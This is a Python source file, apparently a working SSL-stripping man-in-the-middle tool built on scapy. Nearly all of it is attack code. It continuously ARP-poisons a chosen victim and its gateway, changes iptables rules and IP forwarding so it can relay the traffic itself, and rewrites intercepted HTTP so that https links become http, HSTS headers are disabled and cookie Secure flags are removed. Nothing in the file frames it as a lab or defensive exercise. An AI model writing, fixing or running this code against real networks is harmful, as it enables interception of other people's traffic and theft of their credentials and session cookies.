import os
import re
import sys
import time
import threading
import scapy.all as scapy
from dataclasses import dataclass
from typing import Optional

@dataclass
class SSLStripConfig:
    iface: str
    victim_ip: Optional[str]
    gateway_ip: Optional[str]
    listen_port: int
    mode: str
    log_file: Optional[str]

def load_arp_watcher_db(path: str = "arp-watcher.db") -> dict[str, str]:
    db = {}
    try:
        with open(path, "r") as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) >= 2:
                    db[parts[0]] = parts[1]
    except (FileNotFoundError, IOError):
        pass
    return db

def get_mac(ip: str, iface: str, arp_db: Optional[dict[str, str]] = None) -> Optional[str]:
    if arp_db and ip in arp_db:
        return arp_db[ip]
    print(f"[*] IP {ip} not in ARP DB, attempting active resolution...")
    try:
        ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=2, iface=iface, verbose=False)
        if ans:
            return ans[0][1].src
    except Exception as e:
        print(f"[-] Error resolving MAC for {ip}: {e}")
    return None

def run_ssl_strip(config: SSLStripConfig) -> None:
    print(f"[*] Starting SSL Strip on {config.iface}")
    
    # 1. Resolve MACs
    arp_db = load_arp_watcher_db()
    victim_mac = get_mac(config.victim_ip, config.iface, arp_db)
    gateway_mac = get_mac(config.gateway_ip, config.iface, arp_db)
    my_mac = scapy.get_if_hwaddr(config.iface)

    if not victim_mac or not gateway_mac:
        print("[-] MAC resolution failed. Terminating.")
        return

    # 2. Start ARP Poisoning Threads
    def spoof_loop():
        # Tell Victim I am Gateway; Tell Gateway I am Victim
        vic_pkt = scapy.Ether(dst=victim_mac)/scapy.ARP(op=2, pdst=config.victim_ip, psrc=config.gateway_ip)
        gw_pkt = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=config.gateway_ip, psrc=config.victim_ip)
        while True:
            scapy.sendp(vic_pkt, iface=config.iface, verbose=False)
            scapy.sendp(gw_pkt, iface=config.iface, verbose=False)
            time.sleep(2)

    threading.Thread(target=spoof_loop, daemon=True).start()

    # 3. AUTOMATED INTERCEPT (The fix for the freeze)
    start_intercept()
    
    try:
        print("[*] Monitoring traffic... (Press Ctrl+C to stop)")
        scapy.sniff(
            iface=config.iface,
            filter="tcp port 80",
            prn=lambda pkt: process_packet(pkt, config, victim_mac, gateway_mac, my_mac),
            store=0
        )
    except KeyboardInterrupt:
        pass
    finally:
        stop_intercept()

def start_intercept() -> None:
    print("[*] Configuring iptables to block kernel-level forwarding...")
    # Drop forwarded packets so the kernel doesn't forward them automatically
    os.system("iptables -A FORWARD -p tcp --dport 80 -j DROP")
    os.system("iptables -A FORWARD -p tcp --sport 80 -j DROP")
    # Tell the kernel not to try and route these packets itself
    os.system("sysctl -w net.ipv4.ip_forward=0 > /dev/null")

def stop_intercept() -> None:
    print("\n[*] Restoring network state...")
    os.system("iptables -D FORWARD -p tcp --dport 80 -j DROP")
    os.system("iptables -D FORWARD -p tcp --sport 80 -j DROP")
    os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")
    sys.exit(0)

def process_packet(pkt, config, victim_mac, gateway_mac, my_mac):
    # 1. Ignore anything that isn't IP/Ethernet or is our own packet
    if not pkt.haslayer(scapy.IP) or not pkt.haslayer(scapy.Ether):
        return
    if pkt[scapy.Ether].src == my_mac:
        return

    # 2. Determine destination
    if pkt[scapy.IP].src == config.victim_ip:
        target_mac = gateway_mac
    elif pkt[scapy.IP].src == config.gateway_ip:
        target_mac = victim_mac
    else:
        return

    # 3. Modify Payload if it's HTTP Data
    if pkt.haslayer(scapy.Raw):
        payload = pkt[scapy.Raw].load
        modified_payload = rewrite_http_payload(payload)
        
        if modified_payload != payload:
            print(f"[+] Modified HTTP data from {pkt[scapy.IP].src}")
            pkt[scapy.Raw].load = modified_payload
            # Clear checksums to force Scapy to recalculate them
            del pkt[scapy.IP].len
            del pkt[scapy.IP].chksum
            if pkt.haslayer(scapy.TCP):
                del pkt[scapy.TCP].chksum

    # 4. THE FIX: Prepare and send the packet
    # Change the MAC addresses to act as the middleman
    pkt[scapy.Ether].dst = target_mac
    pkt[scapy.Ether].src = my_mac
    
    # Use 'sendp' and specify the interface again
    try:
        # We use verbose=False to keep the console clean
        scapy.sendp(pkt, iface=config.iface, verbose=False, count=1, realtime=True)
    except Exception as e:
        print(f"[-] Forwarding error: {e}")

def rewrite_http_payload(raw_payload: bytes) -> bytes:
    # Use spaces to keep packet length identical
    payload = re.sub(b'https://', b'http://  ', raw_payload, flags=re.IGNORECASE)
    payload = re.sub(b'Strict-Transport-Security', b'X-Ignore-HSTS            ', payload, flags=re.IGNORECASE)
    payload = re.sub(b'; Secure', b';       ', payload, flags=re.IGNORECASE)
    return payload 